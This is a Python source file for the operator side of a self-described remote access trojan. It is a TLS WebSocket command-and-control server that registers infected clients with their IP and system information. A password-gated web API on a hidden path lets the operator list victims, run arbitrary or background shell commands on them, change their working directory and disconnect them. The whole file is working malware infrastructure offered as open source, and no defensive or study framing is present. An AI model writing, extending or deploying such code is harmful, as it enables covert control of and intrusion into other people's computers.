__author__ = "Zhao Bokai"
__license__ = "GPL v3"

from quart import Quart, redirect, url_for, request, make_response, render_template, jsonify, websocket
import asyncio
import websockets
import hashlib
import ssl
import rich
import json
from sys import exit
import logging

import rich.traceback 
import rich.logging

# Configure Rich traceback
rich.traceback.install(show_locals=True)

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[rich.logging.RichHandler()])

# Server configuration
HOST = '0.0.0.0' 
PORT = 8765
WEB_HOST = '0.0.0.0'
WEB_PORT = 5000
SSL_CERT = '../cert.pem' 
SSL_KEY = '../key.pem'
SECURITY_PATH = 'fuck'
SECURITY_PASSWORD_HASH = '6ac3c336e4094835293a3fed8a4b5fedde1b5e2626d9838fed50693bba00af0e' 

# Global variables
app = Quart(__name__)
control_list = {}

# Server core class
class Server:
    def __init__(self):
        logging.info("Server initialization")

    def about(self):
        logging.info("Getting about information")
        about_text = '''About:
Author: Zhao Bokai
Copyright: Copyright © Zhao Bokai, All Rights Reserved.
This is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
Uses GPL v3 license, please comply with the license.'''
        return about_text
    
    def client_list(self):
        logging.info("Getting client list")
        if len(control_list) == 0:
            logging.info("No connected devices currently")
            return "No devices are currently connected."
        else:
            devices = []
            for device in control_list.items():
                devices.append({
                    'id': device[0],
                    'ip': device[1]['ip'],
                    'systeminfo': device[1]['systeminfo']
                })
            logging.info(f"Device list: {devices}")
            return devices
    
    async def delete(self, id):
        logging.info(f"Deleting device: {id}")
        global control_list
        if id in control_list:
            websocket_ = control_list[id]['websocket']
            try:
                await websocket_.send("exit")
                control_list.pop(id)
                logging.info(f"Device {id} deleted successfully")
                return f"Successfully deleted device with ID {id}."
            except Exception as e:
                control_list.pop(id)
                logging.error(f"Failed to delete device {id}: {str(e)}")
                return f"Exception occurred while disconnecting device with ID {id}: {e}"
        else:
            logging.error(f"Device {id} does not exist")
            return f"Device with ID {id} does not exist."

# Client control class
class ControlClient:
    def __init__(self, id):
        logging.info(f"Initializing client controller: {id}")
        self.id = id
        self.websocket = control_list[id]['websocket']
    
    async def system_info(self):
        logging.info(f"Getting device system information")
        try:
            await self.websocket.send("systeminfo")
            result = await self.websocket.recv()
            logging.info(f"System information: {result}")
            return result
        except Exception as e:
            logging.error(f"Failed to get system information: {str(e)}")
            raise
    
    async def execute_command(self, command):
        logging.info(f"Executing command: {command}")
        try:
            await self.websocket.send(f"command:{command}")
            result = await self.websocket.recv()
            logging.info(f"Command result: {result}")
            return result
        except Exception as e:
            logging.error(f"Command execution failed: {str(e)}")
            raise

    async def background(self, command):
        logging.info(f"Executing command in background: {command}")
        try:
            await self.websocket.send(f"background:{command}")
            await self.websocket.recv()
            logging.info("Background command sent successfully")
            return "Command sent"
        except Exception as e:
            logging.error(f"Background command execution failed: {str(e)}")
            raise

    async def change_directory(self, directory):
        logging.info(f"Changing directory: {directory}")
        try:
            await self.websocket.send(f"change_directory:{directory}")
            result = await self.websocket.recv()
            logging.info(f"Directory change result: {result}")
            return result
        except Exception as e:
            logging.error(f"Directory change failed: {str(e)}")
            raise

# Security verification function
def check():
    logging.info("Performing security verification")
    logging.debug(f"Request cookies: {request.cookies}")
    if "Cookie" not in request.cookies:
        logging.warning("Cookie not found")
        return False
    if request.cookies.get('Cookie') == hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest():
        logging.info("Verification passed")
        return True
    else:
        logging.warning("Verification failed")
        return False

# Deny all agent scrape all pages
@app.route("robots.txt")
async def robots():
    return '''User-Agent: *
    Disallow: /
    '''

# Password verification route
@app.route(f"/{SECURITY_PATH}/verify", methods=['POST'])
async def verify():
    logging.info("Received password verification request")
    try:
        json_data = await request.get_json()
        if "password" not in json_data:
            logging.warning("Password not provided")
            return jsonify({'error': 'Password not provided'}), 400
        
        password = json_data["password"]
        if hashlib.sha256(password.encode()).hexdigest() == SECURITY_PASSWORD_HASH:
            logging.info("Password verification successful")
            cookie = hashlib.sha256(SECURITY_PASSWORD_HASH.encode()).hexdigest()
            return jsonify({'Cookie': cookie})
        else:
            logging.warning("Incorrect password")
            return jsonify({'error': 'Incorrect password'}), 401
    except Exception as e:
        logging.error(f"Verification process error: {str(e)}")
        return jsonify({'error': 'Server error'}), 500

# API function routes
@app.route(f"/{SECURITY_PATH}/function", methods=['POST'])
async def function():
    logging.info("Received function request")
    try:
        if not check():
            logging.warning("Unauthorized request")
            return jsonify({'error': 'Unauthorized'}), 401

        json_data = await request.get_json()
        logging.debug(f"Request data: {json_data}")
        
        if json_data is None or "func_name" not in json_data:
            logging.warning("Function name not provided")
            return jsonify({'error': 'Function name not provided'}), 400

        func_name = json_data["func_name"]
        logging.info(f"Requested function: {func_name}")

        valid_functions = ["device_list", "delete", "systeminfo", "command", "background", "change_directory"]
        if func_name not in valid_functions:
            logging.warning(f"Invalid function: {func_name}")
            return jsonify({'error': 'Invalid function name provided'}), 400

        server = Server()

        if func_name == "device_list":
            return jsonify(server.client_list())
        
        if "id" not in json_data:
            logging.warning("Device ID not provided")
            return jsonify({'error': 'Device ID not provided'}), 400
        
        device_id = json_data["id"]
        logging.info(f"Target device: {device_id}")
        
        if not any(device_id in device.values() for device in server.client_list()):
            logging.warning(f"Device does not exist: {device_id}")
            return jsonify({'error': 'Device ID does not exist'}), 400
        
        if func_name == "delete":
            return jsonify({"message": await server.delete(device_id)})
        
        control_client = ControlClient(device_id)
        
        if func_name == "systeminfo":
            return jsonify({"message": await control_client.system_info()})

        if func_name in ["command", "background"]:
            if "command" not in json_data:
                logging.warning("Command not provided")
                return jsonify({'error': 'Command not provided'}), 400
            
            command = json_data["command"]
            if func_name == "command":
                return jsonify({"message": await control_client.execute_command(command)})
            else:
                return jsonify({"message": await control_client.background(command)})
        
        if func_name == "change_directory":
            if "directory" not in json_data:
                logging.warning("Directory not provided")
                return jsonify({'error': 'Directory not provided'}), 400
            
            directory = json_data["directory"]
            return jsonify({"message": await control_client.change_directory(directory)})
    
    except Exception as e:
        logging.error(f"Request processing error: {str(e)}")
        return jsonify({'error': str(e)}), 500

# WebSocket client handler
async def handle_client(websocket):
    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
    logging.info(f"New client connected: {ip}")
    
    try:
        systeminfo = await websocket.recv()
        logging.info(f"Client system information: {systeminfo}")
    except Exception as e:
        logging.error(f"Failed to get system information: {str(e)}")
        systeminfo = "ERROR"
    
    control_list[str(websocket.id)] = {
        "ip": ip,
        "websocket": websocket,
        "systeminfo": systeminfo
    }
    
    logging.info(f"Client {ip} connected successfully, ID: {websocket.id}")
    try:
        await websocket.wait_closed()
    except Exception as e:
        logging.error(f"Connection exception: {str(e)}")
    finally:
        if str(websocket.id) in control_list:
            del control_list[str(websocket.id)]
            logging.info(f"Client {ip} disconnected")

# Server main loop
async def server_loop():
    logging.info("Initializing server")
    logging.info(f"Certificate path: {SSL_CERT}, Key path: {SSL_KEY}")
    
    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
        logging.info("SSL certificate loaded successfully")
    except FileNotFoundError:
        logging.error("Certificate file not found")
        exit(1)
    except Exception as e:
        logging.error(f"SSL loading failed: {str(e)}")
        exit(1)

    logging.info(f"Starting server: {HOST}:{PORT}")
    try:
        async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
            logging.info("Server started successfully")
            try:
                quit_event = asyncio.Event()
                await quit_event.wait()
            except KeyboardInterrupt:
                logging.warning("Server interrupted by user")
    except Exception as e:
        logging.error(f"Server startup failed: {str(e)}")
        exit(1)

# Main program entry
async def main():
    logging.info("Program starting")
    try:
        # Create tasks
        server_task = asyncio.create_task(server_loop())
        web_task = asyncio.create_task(app.run_task(host=WEB_HOST, port=WEB_PORT))

        # Wait for any task to complete or error
        _, tasks = await asyncio.wait(
            [server_task, web_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        for task in tasks:
            task.cancel()
    except Exception as e:
        logging.error(f"Program error: {str(e)}")
        exit(1)

if __name__ == '__main__':
    try:
        print("\033[H\033[J")
        logging.info("Copyright: Copyright © Zhao Bokai, All Rights Reserved.")
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.warning("Program interrupted by user")
        exit(0)
    except Exception as e:
        logging.critical(f"Fatal error: {str(e)}")
        logging.error("Please report to [link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]")
        exit(1)
